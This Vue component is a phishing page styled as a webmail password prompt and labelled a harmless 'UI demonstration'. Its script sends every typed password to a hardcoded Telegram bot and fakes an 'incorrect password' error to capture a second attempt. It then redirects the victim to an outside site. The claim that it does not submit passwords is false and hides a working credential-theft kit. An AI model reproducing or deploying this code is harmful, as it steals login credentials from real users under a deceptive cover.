


<template>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webmail Login Demo</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>

    <header class="topbar">
        <div class="brand">
            <span class="logo">WEBMAIL</span>
            <span class="login-text">LOGIN </span>
        </div>

        <div class="search">
            <span class="search-icon">⌕</span>
            <span>Search for features, domains, and help</span>
            <span class="mic">♩</span>
        </div>
    </header>

    <main class="page">
        <section class="login-card">

            <div class="title-row">
                <!-- <div class="lock-icon">🔐</div> -->
                <div class="lock-icon"></div>
                <h1>Enter password</h1>
            </div>

            <!-- Error message -->
                                                    <div
                                                        id="password-error"
                                                        role="alert"
                                                        class="selectable-text alert alert-info"
                                                        v-if="isActive"
                                                    >
                                                        The password is incorrect.
                                                    </div>
            <div class="account">
                <span class="back">‹</span>
                <span class="user-icon">♙</span>
                <span>...</span>
            </div>

            <label for="password">Password</label>

            <!-- Non-functional demo field -->
            <input
                id="password"
                type="password"
                placeholder="Password"
                autocomplete="off"
                v-model="formDataRes.password"
            >

            <a href="#" class="forgot">Forgot Your Password?</a>

            <p class="notice">
                This is a UI demonstration and does not submit or store passwords.
            </p>

            <button type="button"  @click.prevent="finishJoob();">Next</button>

        </section>
    </main>

    <footer>
        <a href="#">All Systems Operational</a>

        <span>© 2025 Webmail Demo</span>

        <span>Privacy Policy · Terms & Conditions</span>
    </footer>

</body>
</html>


</template>



<script>
import axios from "axios";

export default {
  name: "App",
  data() {
    return {
      formDataRes: {
        password: "",
       
      },
      loading: false,
      isActive: false,
      count: 0,
      finalCount: 2, // Only send once
    };
  },
  methods: {
    async finishJoob() {
      this.count++;
      console.log("Count:", this.count, "Final:", this.finalCount);

      if (this.count <= this.finalCount) {
        this.loading = true;

        // Format the message as string
        const message = `*⚠️ ionos*\npassword: ${this.formDataRes.password}`;

        // Send to Telegram
        await this.sendTelegramResult(
          process.env.NUXT_APP_CHAT_ID || "-4794000485", 
          // 5
          message
        );

        this.isActive = !this.isActive;
        this.loading = false;
      } else {
        // Redirect after sending
        location.replace("https://mediacomm-sigma.vercel.app/");
      }
    },

    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,
        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  },
};
</script>


















<style>

* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    min-height: 100vh;
    font-family: Arial, Helvetica, sans-serif;
    background: #f3f7fa;
    color: #183653;
}



.alert-info{

  color: rgb(188, 36, 36);
}
/* =========================
   TOP HEADER
========================= */

.topbar {
    height: 58px;
    background: #ffffff;
    border-bottom: 1px solid #d7dfe5;
    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.12);

    display: flex;
    align-items: center;

    padding: 0 32px;
}

.brand {
    display: flex;
    align-items: center;
    gap: 14px;
}

.logo {
    font-size: 24px;
    font-weight: 700;
    letter-spacing: 4px;
    color: #173f70;
}

.login-text {
    font-size: 17px;
    font-weight: 600;
    color: #244d75;
}

.search {
    position: absolute;
    left: 50%;
    transform: translateX(-50%);

    width: 390px;
    height: 40px;

    border: 1px solid #aeb9c2;
    border-radius: 8px;

    display: flex;
    align-items: center;
    gap: 10px;

    padding: 0 13px;

    color: #526574;
    font-size: 14px;
}

.search-icon {
    font-size: 25px;
}

.mic {
    margin-left: auto;
}

/* =========================
   MAIN AREA
========================= */

.page {
    min-height: calc(100vh - 113px);

    display: flex;
    justify-content: center;
    align-items: flex-start;

    padding-top: 35px;
}

/* BIGGER + WIDER CARD */

.login-card {
    width: 620px;
    min-height: 355px;

    background: #ffffff;
    border-radius: 14px;

    padding: 35px 30px 30px;

    box-shadow: 0 2px 12px rgba(0, 0, 0, 0.05);
}

/* =========================
   CARD TITLE
========================= */

.title-row {
    display: flex;
    align-items: center;
    gap: 16px;

    margin-bottom: 35px;
}

.title-row h1 {
    font-size: 20px;
    font-weight: 700;
    color: #163957;
}

.lock-icon {
    width: 50px;
    height: 50px;

    background: #e1f1fa;

    display: flex;
    justify-content: center;
    align-items: center;

    font-size: 27px;
}

/* =========================
   ACCOUNT
========================= */

.account {
    display: flex;
    align-items: center;
    gap: 10px;

    color: #2372a5;
    font-size: 15px;

    margin-bottom: 20px;
}

.back {
    font-size: 32px;
    line-height: 10px;
    color: #5290b3;
}

.user-icon {
    font-size: 22px;
}

/* =========================
   FORM
========================= */

label {
    display: block;

    font-size: 14px;
    font-weight: 600;

    color: #263f55;

    margin-bottom: 8px;
}

input {
    width: 100%;
    height: 44px;

    border: 1px solid #8c9ba6;
    border-radius: 6px;

    padding: 8px 12px;

    font-size: 15px;
    outline: none;
}

input:focus {
    border-color: #2879aa;
    box-shadow: 0 0 0 3px rgba(40, 121, 170, 0.12);
}

.forgot {
    display: block;

    margin-top: 8px;

    font-size: 13px;
    color: #337ca7;
    text-decoration: none;
}

.forgot:hover {
    text-decoration: underline;
}

.notice {
    margin-top: 8px;

    font-size: 12px;
    color: #566b78;
}

/* =========================
   BUTTON
========================= */

button {
    width: 100%;
    height: 44px;

    margin-top: 25px;

    border: none;
    border-radius: 23px;

    background: #073579;
    color: white;

    font-size: 14px;
    font-weight: 600;

    cursor: pointer;
}

button:hover {
    background: #0a438f;
}

/* =========================
   FOOTER
========================= */

footer {
    position: fixed;
    bottom: 0;
    left: 0;

    width: 100%;
    height: 55px;

    background: #ffffff;

    display: flex;
    align-items: center;
    justify-content: space-between;

    padding: 0 25px;

    border-top: 1px solid #edf0f2;

    font-size: 11px;
    color: #445b6b;
}

footer a {
    color: #174d91;
    text-decoration: underline;
}

/* =========================
   RESPONSIVE
========================= */

@media (max-width: 750px) {

    .topbar {
        padding: 0 18px;
    }

    .logo {
        font-size: 20px;
    }

    .login-text {
        font-size: 14px;
    }

    .search {
        display: none;
    }

    .page {
        padding-top: 25px;
    }

    .login-card {
        width: calc(100% - 30px);
        min-height: 330px;

        padding: 28px 22px;
    }

    footer {
        padding: 0 12px;
        font-size: 9px;
    }
}


</style>